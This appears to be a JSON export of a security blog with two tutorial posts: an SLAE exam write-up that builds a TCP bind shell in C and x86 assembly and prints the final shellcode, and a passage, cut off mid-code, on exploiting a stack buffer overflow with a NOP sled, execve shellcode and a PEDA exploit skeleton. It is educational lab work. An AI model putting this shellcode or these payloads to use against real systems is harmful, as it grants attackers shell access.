{"categories":[],"posts":[{"content":" SLAE The SecurityTube Linux Assembly Expert is a course and certification from the folks over at http://www.securitytube-training.com and also available on http://www.pentesteracademey.com.\nThis blog post is the first post required for the exam requirements. My student id is: PA-4897 and the github url to my repo is https://github.com/mwest67/slae.\nGetting started Our first task is to create a tcp bind shell in shellcode. In order to do this lets first understand what a bind shell is. Simply put a bind shell listens for a network connection on a particular port and when a connection is made it then redirects the programs STDIN, STDOUT and STDERR to the new connection, it then calls execve to replace the current process with a shell (usually /bin/sh). The client is then free to interact with the shell\nRight, now we know what we want to achieve lets get started first thing first lets list all the syscalls we are going to need in order to achieve this task\n socket - This is needed to create the listening socket bind - This is so we can tell the OS where to listen listen - This is required to start the socket listening for connections accept - This is to accept incoming connections dup2 - This is so we can redirect STDIN, OUT and ERR execve - This is so we can spawn the shell  Initial Version Before we break out the assembler, let make sure we are good with achieving this in a higher level language like C\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;linux/socket.h\u0026gt;#include \u0026lt;arpa/inet.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; int main() { /* Initialize some variables */ int sockfd = 0, clientfd = 0; /* Initialize the socket */ sockfd = socket(AF_INET, SOCK_STREAM, 0); /* Set up the params for the server socket */ struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = htonl(INADDR_ANY); server_addr.sin_port = htons(5000); /* htons to convert to network byte order */ /* Bind to the address we gave it */ bind(sockfd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr)); /* tell the server to listen */ listen(sockfd, 10); /* * We should now start accepting client connections * the NULLS are because we dont care who is connecting * if we did we would need a pointer to a fresh sockaddr_in * struct for the accept call to fill in */ clientfd = accept(sockfd, (struct sockaddr*)NULL, NULL); /* Redirect STDIN(0), STDOUT(1) and STDERR(2) to the client socket */ dup2(clientfd, 0); dup2(clientfd, 1); dup2(clientfd, 2); /* execute the shell */ char* args[] = {\u0026#34;/bin/bash\u0026#34;, NULL}; execve(args[0], args, NULL); } Lets compile and run\n $ gcc -m32 -o bind_shell bind_shell.c $ ./bind_shell  And now from another shell\n $ nc localhost 5000 ls bind bind.o bind_shell bind_shell.c  Right so our C version is working, the code is pretty well commented but it is clear that there is no error checking and also that there are LOTS of constants that we wont have when we come to write this in assembly. These are\n syscall numbers (as C provides convenience functions for these) AF_INET - The protocol family SOCK_STREAM - Used for TCP connection INADDR_ANY - Used to tell OS to listen on all addresses  We also need to figure out how the sockaddr_in structure needs to look on the stack\nInformation Gathering 1. Syscall Numbers Lets gather all the syscall numbers. For this installed the libc6-dev-i386 package on my 64bit kali vm. This installs the linux headers into /usr/include. This include file we are specifically interested in for the syscall numbers is /usr/include/asm/unistd_32.h a quick grep through this yields the following syscall numbers\n#define __NR_socket 359 #define __NR_bind 361 #define __NR_listen 363 #define __NR_accept4 364 #define __NR_dup2 63 #define __NR_execve 11  Note: There is an x86 specific syscall called socketcall and is number 102 which a lot of people use when producing this type of shellcode but I have decided to use the individual calls.\nConstants Right, we now have all our syscall numbers time to gather all of our other constants. Lets take a grep through the header files\n $ grep -r AF_INET /usr/include/**/*.h /usr/include/bits/socket.h:#define AF_INET PF_INET /usr/include/bits/socket.h:#define AF_INET6 PF_INET6 /usr/include/linux/if_link.h: * [AF_INET] = { /usr/include/linux/if_link.h: * [AF_INET6] = { /usr/include/linux/in6.h: * Types and definitions for AF_INET6 /usr/include/linux/in6.h: unsigned short int sin6_family; /* AF_INET6 */ /usr/include/linux/l2tp.h: __kernel_sa_family_t l2tp_family; /* AF_INET */ /usr/include/linux/l2tp.h: __kernel_sa_family_t l2tp_family; /* AF_INET6 */ /usr/include/X11/Xdmcp.h:#if defined(IPv6) \u0026amp;\u0026amp; defined(AF_INET6) $ grep -r PF_INET /usr/include/**/*.h /usr/include/bits/socket.h:#define PF_INET 2 /* IP protocol family. */ /usr/include/bits/socket.h:#define PF_INET6 10 /* IP version 6. */ /usr/include/bits/socket.h:#define AF_INET PF_INET /usr/include/bits/socket.h:#define AF_INET6 PF_INET6  As you can see from above AF_INET is aliased to PF_INET so a quick search reveals AF_INET = 2. If we continue grepping for the other constants we find that SOCK_STREAM = 1 and INADDR_ANY = 0\nSyscalls from Assembly Before we head off on this trip lets remind our selves of how syscalls happen from assembly. Below is the order of business - Put the syscall number in the eax register - Setup the syscall params using EBX, ECX and EDX, syscalls with more params either use the stack or other registers sucj as ESI - Call interupt 0x80 to trigger the call - Results of the syscall gets returned in EAX\nLets also refresh ourselves on the desired characteristics of our shellcode - Small as possible (this means being crafty with params etc) - No bad chars such as NULL (meaning we want to use the appropriate registers) - Port numbers need to be in Network byte order or Big Endian\nLets Begin First thing we going to need to do is zero out our registers so we have a clean slate\nxor eax, eax ; Zero out registers xor ebx, ebx xor ecx, ecx xor edx, edx With that out the way lets now take a look at the socket syscall docs (link above)\nsockfd = socket(int socket_family, int socket_type, int protocol); Right so the registers need to be as follows - EAX: 359 for socket syscall (see above) - EBX: 2 for AF_INET (1st param) - ECX: 1 for SOCK_STREAM (2nd param) - EDX: 0 for IP (3rd param which is already set via xor above)\nIf all goes well we should get a file descriptor to a sock back in EAX. Heres the code\nmov bl, 0x2 ; AF_INET inc cl ; SOCK_STREAM = 1 - Leave EDX 0 for IP mov ax, 0x0167 ; Socket syscall number int 0x80 ; make call Notice how we used the 8 bit versions of EBX and ECX to avoid NULLs and also how we used \u0026ldquo;inc cl\u0026rdquo; to save a byte as apposed to a mov instruction. We used the 16 bit version of EAX to avoid NULL and because 0x167 in hex (359 dec) needs two bytes.\nSo at this point we are assuming everything went ok (we are writing shellcode and we cant spare the bytes for error checking) which means that there should be a socket file descriptor sat in EAX waitning for us, the problem is we need EAX for our next syscall so we shall have to save it somewhere! Lets use EDI\nxchg edi, eax ; store socketfd I used xchg here to save a byte and I chose EDI so I didnt have to reset ESI for the accept4 call later (I will explain more on this later)\nNow that is out of the way we need to set up the bind syscall, we have the syscall number and the address familly constants all worked out for this but we now need to figure out how the sockaddr_in structure looks on the stack. First let us remind our selves how sockaddr_in looks in C\nstruct sockaddr_in { short sin_family; unsigned short sin_port; struct in_addr sin_addr; char sin_zero[8]; };  So we need sin_family which if you remember the C version is just AF_INET then we need the port which has to be in network byte order. We are using port 5000 which is 0x1388 in hex so network byte order would be 0x8813. The next parameter is the IP address structure which contains the IP to bind to, since we are binding to all IP\u0026rsquo;s using INADDR_ANY which is 0 then this value can be zero. Next is the interesting value which is the sin_zero field now according to the documentation this field is \u0026ldquo;Padding to make structure the same size as SOCKADDR\u0026rdquo; which means we dont need to bother setting it so our structure on the stack will be\nHigh Mem: 0x00000002 ; sin_family (AF_INET) 0x8813 ; sin_port (Network Byte Order) Low Mem: 0x00000000 ; sin_addr (INADDR_ANY)  Remeber as this is the stack we have to push things on in reverse order. Lets look at the bind call args again just to remind ourselves.\nint bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);  Ok so we need EBX to point to the server socket handle (currently in EDI), we need a pointer to our sockaddr_in structure we put on the stack in ECX and then we need the size of the structure in EDX which can be computed as 2 bytes for AF_INET (short) 2 bytes for the port, 4 bytes for the long (inet address) then 8 bytes for the padding which adds up to 16 bytes or 0x10\nSo lets get this all set up\n; Now call bind push edx ; INADDR_ANY - IP to bind to in soccaddr_in push word 0x8813 ; Port in Network byte order push word bx ; Address Family AF_INET mov ecx, esp ; get pointer to structure xchg ebx, edi ; put server socket fd into ebx (use xchg to save a byte) mov dl, 0x10 ; set struct len mov ax, 0x0169 ; bind syscall int 0x80 ; make call Hopefully this makes sense first we have 3 pushes which set up our sockaddr_in struct on the stack, third push pushes the EBX register which already contains 0x2 for AF_INET. Whe then move value of the stack pointer into ECX so we now have a pointer to our structure. Next we use xchg to get the socket handle from edi into EBX we then move the struct length of 16 bytes into EDX. Lastly we setup the bind syscall and execute it.\nNow we have to call the listen call. Listen has the following signature.\nint listen(int sockfd, int backlog);  As EBX is already set to the server socket fd we only have to set ECX to a sensible value as it currently a pointer to a sockaddr_in struct. We achieve this by xchg ing ECX and EDX as EDX has the value 16 which is an acceptable value for the backlog parameter.\n; Call listen xchg ecx, edx ; set up the backlog parameter mov ax, 0x016B ; set syscall number for listen int 0x80 ; make the call Time to move on, next up we want to call accept (or accept4 in our case). Lets have a look at the signature for this call\nint accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);  So breaking this down we want\n EBX to be the socket fd we are accepting connections from ECX to be a pointer to the struct that will get filled with the client address EDX to be the lenth of the structure ESI to be the flags setting  In our code EBX is already set up, we dont care about the client address so ECX and EDX can be 0x0 although I dont zero out EDX as it seems to be ignored when ECX points nowhere. Now how did I find that ESI was used for the flags parameter? I googled and could not find what I wanted and I was too lazy to go digging in the kernel source. As it turns out when I coded the inital socket call I originally used ESI to store the server socket fd in so when i did the xchg with EBX to setup the call to bind this meant ESI now had the value 0x2. When I had completed my code I found it failed on the accept call. I ran the tool with a cool linux debugging tool called strace and below is the output\n $ strace ./bind execve(\u0026quot;./bind\u0026quot;, [\u0026quot;./bind\u0026quot;], [/* 21 vars */]) = 0 strace: [ Process PID=2852 runs in 32 bit mode. ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 bind(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr(\u0026quot;0.0.0.0\u0026quot;)}, 16) = 0 listen(3, 16) = 0 accept4(3, NULL, 0xffb21478, 0x2 /* SOCK_??? */) = -1 EINVAL (Invalid argument)  This told me all my other parameters were correct I just needed find where the flags parameter was being set so I turned to trusty old GDB\n $ gdb -q ./bind Reading symbols from ./bind...(no debugging symbols found)...done. (gdb) break _start Breakpoint 1 at 0x8048060 (gdb) run Starting program: /root/src/bind Breakpoint 1, 0x08048060 in _start () (gdb) disassemble Dump of assembler code for function _start: =\u0026gt; 0x08048060 \u0026lt;+0\u0026gt;: xor %eax,%eax 0x08048062 \u0026lt;+2\u0026gt;: xor %ebx,%ebx 0x08048064 \u0026lt;+4\u0026gt;: xor %ecx,%ecx 0x08048066 \u0026lt;+6\u0026gt;: xor %edx,%edx 0x08048068 \u0026lt;+8\u0026gt;: mov $0x2,%bl 0x0804806a \u0026lt;+10\u0026gt;: inc %cl 0x0804806c \u0026lt;+12\u0026gt;: mov $0x167,%ax 0x08048070 \u0026lt;+16\u0026gt;: int $0x80 0x08048072 \u0026lt;+18\u0026gt;: xchg %eax,%esi 0x08048073 \u0026lt;+19\u0026gt;: push %edx 0x08048074 \u0026lt;+20\u0026gt;: pushw $0x8813 0x08048078 \u0026lt;+24\u0026gt;: push %bx 0x0804807a \u0026lt;+26\u0026gt;: mov %esp,%ecx 0x0804807c \u0026lt;+28\u0026gt;: xchg %ebx,%esi 0x0804807e \u0026lt;+30\u0026gt;: mov $0x10,%dl 0x08048080 \u0026lt;+32\u0026gt;: mov $0x169,%ax 0x08048084 \u0026lt;+36\u0026gt;: int $0x80 0x08048086 \u0026lt;+38\u0026gt;: xchg %ecx,%edx 0x08048088 \u0026lt;+40\u0026gt;: mov $0x16b,%ax 0x0804808c \u0026lt;+44\u0026gt;: int $0x80 0x0804808e \u0026lt;+46\u0026gt;: xor %ecx,%ecx 0x08048090 \u0026lt;+48\u0026gt;: mov $0x16c,%ax 0x08048094 \u0026lt;+52\u0026gt;: int $0x80 0x08048096 \u0026lt;+54\u0026gt;: xchg %eax,%ebx 0x08048097 \u0026lt;+55\u0026gt;: mov $0x2,%cl End of assembler dump. (gdb) break *0x08048094 Breakpoint 2 at 0x8048094 (gdb) c Continuing. Breakpoint 2, 0x08048094 in _start () (gdb) info registers eax 0x16c 364 ecx 0x0 0 edx 0xffffd6f8 -10504 ebx 0x3 3 esp 0xffffd6f8 0xffffd6f8 ebp 0x0 0x0 esi 0x2 2 edi 0x0 0 eip 0x8048094 0x8048094 \u0026lt;_start+52\u0026gt; eflags 0x246 [ PF ZF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x0 0 (gdb)  see the 0x2 in ESI? I set that to 0 and boom! my accept call was working\n(gdb) set $esi = 0 (gdb) c Continuing.  The program is now waiting for connections. I now can either xor ESI or use EDI to store the server socket fd. I chose to use EDI instead however on second thoughts the program this shellcode may be instered into may have already set ESI so its best to xor it lets look at the code for the accept call\nxor ecx, ecx ; zero out registers xor esi, esi mov ax, 0x016c ; set accept syscall int 0x80 ; make the call xchg ebx, eax ; store the client socket fd in ebx so we can use for the dup call Notice how I use xchg to store the return value of accept (which is the client socket fd) into EBX which will be the first parameter for the three dup2 calls which have to come next\nRight on to the dup2 calls, here we have to redirect our processes STDIN, STDOUT and STDERR to the client socket which we shall achieve using dup2. Observant reader might realize that STDIN, STDOUT and STDERR have the values 0, 1 \u0026amp; 2 and calling dup2 sounds a lot like a job for a loop. So here what we shall do is set the counter register (ECX) to 0x2 perform the dup2 call then decrement ECX if the sign flag has not been set (ECX is stil \u0026gt;= 0) then we shall loop around again calling the dup2 again. This should end up making the following dup 2 calls.\n dup2(4, 2) dup2(4, 1) dup2(4, 0)  These three calls will redirect our STDIN, STDOUT and STDERR to the client socket. Here is the code\nmov cl, 0x2 loop: mov al, 0x3f ; setup dup2 call int 0x80 ; call dup2 dec ecx ; decrement the loop counter jns loop ; if the sign flag is not set then repeat the loop Last thing to do is to make the execve call and then were done. Lets look at the execve signature\nint execve(const char *filename, char *const argv[], char *const envp[]);  Here is how we want the registers to look\n EBX: pointer to the NULL terminated string \u0026ldquo;//bin/sh\u0026rdquo; ECX: pointer to an array containing the aruments to the program (includes //bin/sh string itself) EDX: NULL as we are not going to pass any environment to the shell  A couple of points to note for this are 1. Its easier to push strings if they are multiples of 4 in length which is why we use //bin/sh as it is 8 characters in length and linux doesnt care about the extra / 2. We have to push the string on the stack in reverse so we push hs/nib//\nHere is the code\npush eax ; push NULL onto stack to termins //bin/sh push 0x68732f6e ; push //bin/sh in reverse onto the stack push 0x69622f2f ; see above mov ebx, esp ; move address of //bin/sh into EBX (execve\u0026#39;s 1st parameter) push eax ; this serves two purposes 1, to use for EDX (we will pass no ; environment to the shell and also as part of the array of ; args that we will pass to as the 2nd arg of execve mov edx, esp ; see above push ebx ; ESP now points to and array of args [address of //bin/sh, 0x00] ; these will act as the args to //bin/sh mov ecx, esp ; setup the 3rd argument mov al, 0x0b ; set the EAX register to the execve sys call number ; using al to remove any null bytes int 0x80 ; make the call Right all done! Below is the code in all its glory!!\nglobal _start section .text _start: xor eax, eax ; Zero out registers xor ebx, ebx xor ecx, ecx xor edx, edx xor edi, edi ; Setup Socket call mov bl, 0x2 ; AF_INET inc cl ; SOCK_STREAM = 1 - Leave EDX 0 for IP mov ax, 0x0167 ; Socket syscall number int 0x80 ; make call xchg edi, eax ; store socketfd ; Now call bind push edx ; INADDR_ANY - IP to bind to in soccaddr_in push word 0x8813 ; Port in Network byte order push word bx ; Address Family AF_INET mov ecx, esp ; get pointer to structure xchg ebx, edi ; put server socket fd into ebx (use xchg to save a byte) mov dl, 0x10 ; set struct len mov ax, 0x0169 ; bind syscall int 0x80 ; make call ; Call listen xchg ecx, edx ; set up the backlog parameter mov ax, 0x016B ; set syscall number for listen int 0x80 ; make the call xor ecx, ecx ; zero out registers mov ax, 0x016c ; set accept syscall int 0x80 ; make the call xchg ebx, eax ; store the client socket fd in ebx so we can use for the dup call mov cl, 0x2 loop: mov al, 0x3f ; setup dup2 call int 0x80 ; call dup2 dec ecx ; decrement the loop counter jns loop ; if the sign flag is not set then repeat the loop ; this will tie our stdin, out and error to the client socket xor eax, eax push eax ; push NULL onto stack to termins //bin/sh push 0x68732f6e ; push //bin/sh in reverse onto the stack push 0x69622f2f ; see above mov ebx, esp ; move address of //bin/sh into EBX (execve\u0026#39;s 1st parameter) push eax ; this serves two purposes 1, to use for EDX (we will pass no ; environment to the shell and also as part of the array of ; args that we will pass to as the 2nd arg of execve mov edx, esp ; see above push ebx ; ESP now points to and array of args [address of //bin/sh, 0x00] ; these will act as the args to //bin/sh mov ecx, esp ; setup the 3rd argument mov al, 0x0b ; set the EAX register to the execve sys call number ; using al to remove any null bytes int 0x80 ; make the call Lets compile, link and run it\n $ x86asm -f elf32 -o bind.o bind_shell.x86asm $ ld -m elf_i386 -o bind bind.o $ ./bind  And now on another shell\n $ nc localhost 5000 ls bind bind.o bind_shell bind_shell.c bind_shell.x86asm  Woop woop, party time!! Well not quite we wanted shellcode not and assembly program. Lets run this through objdump\n $ objdump -d bind.o bind.o: file format elf32-i386 Disassembly of section .text: 00000000 \u0026lt;_start\u0026gt;: 0: 31 c0 xor %eax,%eax 2: 31 db xor %ebx,%ebx 4: 31 c9 xor %ecx,%ecx 6: 31 d2 xor %edx,%edx 8: 31 ff xor %edi,%edi a: b3 02 mov $0x2,%bl c: fe c1 inc %cl e: 66 b8 67 01 mov $0x167,%ax 12: cd 80 int $0x80 14: 97 xchg %eax,%edi 15: 52 push %edx 16: 66 68 13 88 pushw $0x8813 1a: 66 53 push %bx 1c: 89 e1 mov %esp,%ecx 1e: 87 df xchg %ebx,%edi 20: b2 10 mov $0x10,%dl 22: 66 b8 69 01 mov $0x169,%ax 26: cd 80 int $0x80 28: 87 ca xchg %ecx,%edx 2a: 66 b8 6b 01 mov $0x16b,%ax 2e: cd 80 int $0x80 30: 31 c9 xor %ecx,%ecx 32: 31 f6 xor %esi,%esi 34: 66 b8 6c 01 mov $0x16c,%ax 38: cd 80 int $0x80 3a: 93 xchg %eax,%ebx 3b: b1 02 mov $0x2,%cl 0000003d \u0026lt;loop\u0026gt;: 3d: b0 3f mov $0x3f,%al 3f: cd 80 int $0x80 41: 49 dec %ecx 42: 79 f9 jns 3d \u0026lt;loop\u0026gt; 44: 31 c0 xor %eax,%eax 46: 50 push %eax 47: 68 6e 2f 73 68 push $0x68732f6e 4c: 68 2f 2f 62 69 push $0x69622f2f 51: 89 e3 mov %esp,%ebx 53: 50 push %eax 54: 89 e2 mov %esp,%edx 56: 53 push %ebx 57: 89 e1 mov %esp,%ecx 59: b0 0b mov $0xb,%al 5b: cd 80 int $0x80  Great we appear to have avoided the dreaded NULL bytes!!. Lets get this into shell code\n $ for i in $(objdump -d bind.o | grep \u0026quot;^ \u0026quot; | cut -f2); do echo -n '\\x'$i; done; echo \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xff\\xb3\\x02\\xfe\\xc1\\x66\\xb8\\x67\\x01\\xcd\\x80\\x97\\x52\\x66\\x68\\x13 \\x88\\x66\\x53\\x89\\xe1\\x87\\xdf\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x87\\xca\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc9 \\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x93\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73 \\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80  Lets put this into our shellcode test harness\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xff\\xb3\\x02\\xfe\\xc1\\x66\\xb8\\x67\\x01\\xcd\\x80\\x97\\x52\\x66\\x68\\x13\u0026#34;\\ \u0026#34;\\x88\\x66\\x53\\x89\\xe1\\x87\\xdf\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x87\\xca\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc9\u0026#34;\\ \u0026#34;\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x93\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\u0026#34;\\ \u0026#34;\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; int main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Lets run it\n $ gcc -o shell_test -fno-stack-protector -z execstack -m32 shell_test.c $ ./shell_test Shellcode Length: 93  And now on another shell\n $ nc localhost 5000 ls bind bind.o bind_shell bind_shell.c bind_shell.x86asm shell_test.c shell_test  Great our reverse shell works and in 93 bytes which is not bad but I have found shellcode on shell-storm which does this extact function in 89 bytes. I may work on this to get it smaller but I think this is good enough for now.\nNote: I had gotten this down to 87 bytes when running as a straight assembly program however when running in the C skeleton a few things became apparent and I needed to modify my code these were\n I had to xor EDI as it was not 0x0 by the time my code go executed I had to re xor eax in the execve code as this was not 0 by the time my code got executed  Cheers and happy shellcoding!\n","id":0,"section":"posts","summary":"SLAE The SecurityTube Linux Assembly Expert is a course and certification from the folks over at http://www.securitytube-training.com and also available on http://www.pentesteracademey.com.\nThis blog post is the first post required for the exam requirements. My student id is: PA-4897 and the github url to my repo is https://github.com/mwest67/slae.\nGetting started Our first task is to create a tcp bind shell in shellcode. In order to do this lets first understand what a bind shell is.","tags":["32bit","linux","assembly","shellcode","slae"],"title":"SLAE Tcp Bind Shell","uri":"/2017/03/slae-tcp-bind-shell/","year":"2017"},{"content":" What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like\n3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address).\nWhat this means for an attacker is that we have a way to control the flow of the programs execution, if we can overflow the buffer then we can overwrite the return address with an address which points to our malicious code and then when the function returns our code will get executed.\nShow me the money! Right below is a vulnerable C program. (follow along by using the vagrant file I supplied in my post about vagrant)\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; int main(int argc, char *argv[]) { char buf[64]; strcpy(buf, argv[1]); puts(buf); return 0; } Lets compile and run\n $ gcc -fno-stack-protector -z execstack -o vuln vuln.c $ ./vuln AAAA AAAA  Good all working, notice we have turned off stack protection (stack canaries) and we have made the stack executable. There is one other protection we want to disable which is ASLR\n $ sudo bash -c \u0026quot;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\u0026quot;  Now we have a 32bit box circa 2009 ish. lets go break this thing. Fire up the program in gdb\n $ gdb ./vuln  First thing we want to do is to find out the size of the buffer that makes the program crash. Now the good old way was to create patterns with loads of AAAA\u0026rsquo;s followed by BBBB\u0026rsquo;s etc This was tiresome and tedious so some smart programmer (longld on github) created peda which is a gdb plugin to help with exploit development.\nFirst we\u0026rsquo;ll create a cyclic pattern and set it to an argument\n peda-gdb$ pattern create 100 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' gdb-peda$ pset arg 'cyclic_pattern(100)' gdb-peda$ pshow arg arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL gdb-peda$ run [----------------------------------registers-----------------------------------] EAX: 0x0 EBX: 0xb7fd1ff4 --\u0026gt; 0x1a0d7c ECX: 0xffffffff EDX: 0xb7fd38b8 --\u0026gt; 0x0 ESI: 0x0 EDI: 0x0 EBP: 0x65414149 ('IAAe') ESP: 0xbffff650 (\u0026quot;AJAAfAA5AAKAAgAA6AAL\u0026quot;) EIP: 0x41344141 ('AA4A') EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41344141 [------------------------------------stack-------------------------------------] 0000| 0xbffff650 (\u0026quot;AJAAfAA5AAKAAgAA6AAL\u0026quot;) 0004| 0xbffff654 (\u0026quot;fAA5AAKAAgAA6AAL\u0026quot;) 0008| 0xbffff658 (\u0026quot;AAKAAgAA6AAL\u0026quot;) 0012| 0xbffff65c (\u0026quot;AgAA6AAL\u0026quot;) 0016| 0xbffff660 (\u0026quot;6AAL\u0026quot;) 0020| 0xbffff664 --\u0026gt; 0xbffff600 (\u0026quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\u0026quot;) 0024| 0xbffff668 --\u0026gt; 0xbffff6f0 --\u0026gt; 0xbffff893 (\u0026quot;LC_PAPER=en_GB.UTF-8\u0026quot;) 0028| 0xbffff66c --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41344141 in ?? () gdb-peda$  As you can see a buffer of 100 chars crashed the program, lets use peda to find out what exact offset in the buffer caused the crash\n $ gdb-peda$ pattern offset 0x41344141 1093943617 found at offset: 76  Whay choose that hex value? well that was the walue of EIP when the program crashed. We had overflowed the return address and the program tried to jump to that address, we simply told peda to seacch for that byte pattern in the cyclic pattern it had created for us ealier. PEDA told us that there are 76 characters in the buffer before the return address gets overflowed.\nNext step is to get us some shellcode and store it in a variable\n gdb-peda$ shellcode generate Available shellcodes: x86/bsd bindport x86/bsd connect x86/bsd exec x86/linux bindport x86/linux connect x86/linux exec gdb-peda$ shellcode generate x86/linux exec # x86/linux/exec: 24 bytes shellcode = ( \u0026quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\u0026quot; \u0026quot;\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\u0026quot; ) gdb-peda$ python \u0026gt;shellcode = ( \u0026gt; \u0026quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\u0026quot; \u0026gt; \u0026quot;\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\u0026quot; \u0026gt;) \u0026gt;end gdb-peda$  So it turns out peda also has a library of shellcode as well as an interface to shelstorm.org. What we have done here is to get peda to display the shellcode for an execve shell (see my shellcode article). We then use peda\u0026rsquo;s python command to assign this to a python variable.\nLets craft our payload\n gdb-peda$ pset arg '\u0026quot;A\u0026quot; * 76 + \u0026quot;BBBB\u0026quot; + \u0026quot;\\x90\u0026quot;*500 + shellcode' gdb-peda$ r [----------------------------------registers-----------------------------------] EAX: 0x0 EBX: 0xb7fd1ff4 --\u0026gt; 0x1a0d7c ECX: 0xffffffff EDX: 0xb7fd38b8 --\u0026gt; 0x0 ESI: 0x0 EDI: 0x0 EBP: 0x41414141 ('AAAA') ESP: 0xbffff450 --\u0026gt; 0x90909090 EIP: 0x42424242 ('BBBB') EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x42424242 [------------------------------------stack-------------------------------------] 0000| 0xbffff450 --\u0026gt; 0x90909090 0004| 0xbffff454 --\u0026gt; 0x90909090 0008| 0xbffff458 --\u0026gt; 0x90909090 0012| 0xbffff45c --\u0026gt; 0x90909090 0016| 0xbffff460 --\u0026gt; 0x90909090 0020| 0xbffff464 --\u0026gt; 0x90909090 0024| 0xbffff468 --\u0026gt; 0x90909090 0028| 0xbffff46c --\u0026gt; 0x90909090 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x42424242 in ?? () gdb-peda$  As you can see the program crashed again bit this time EIP points to out B\u0026rsquo;s (0x42424242). Let me explain the payload string. PEDA allow you to use python expressions to set the argument that will be passed to the program when gdn runs it so the payload is broken down as follows * \u0026ldquo;A\u0026rdquo; * 76 - 76 A\u0026rsquo;s (which we found using pattern offset) * \u0026ldquo;BBBB\u0026rdquo; - This will end up being the return address to our shellcode * \u0026ldquo;0x90\u0026rdquo; * 500 - 500 NOPS which gives us a margin of error with the return address * shellcode - Our shellcode string we stored in the variable earlier\nRight we currently have one thing left to do, find the address to jump to! When the program crashed peda displayed a nice view of the stack and it seems to be filled with our NOPS so we\u0026rsquo;ll pick and address near the bottom and insert it into our payload\n gdb-peda$ pset arg '\u0026quot;A\u0026quot; * 76 + \u0026quot;\\x6c\\xf4\\xff\\xbf\u0026quot; + \u0026quot;\\x90\u0026quot;*500 + shellcode' gdb-peda$ r AAAAAAAAAAAAAAAA........ process 8331 is executing new program: /bin/dash $  Hey presto we have a shell! Why is the address backwards? little endian my friends! go and google it. One point to note is that peda provides a function for you to do this so you arg could become\n gdb-peda$ pset arg '\u0026quot;A\u0026quot; * 76 + int2hexstr(0xbffff46c) + \u0026quot;\\x90\u0026quot;*500 + shellcode'  Weaponize it! Lets use peda to weaponize this thing! PEDA has some nifty commands to write exploit skeletons\n gdb-peda$ skeleton argv exploit.py Writing skeleton code to file \u0026quot;exploit.py\u0026quot;  This has generated the following code\n#!/usr/bin/env python # # Template for local argv exploit code, generated by PEDA # import os import sys import struct import resource import time def usage(): print \u0026#34;Usage: %starget_program\u0026#34; % sys.argv[0] return def pattern(size=1024, start=0): try: bytes = open(\u0026#34;pattern.txt\u0026#34;).read(size+start) return bytes[start:] except: return \u0026#34;A\u0026#34;*size def nops(size=1024): return 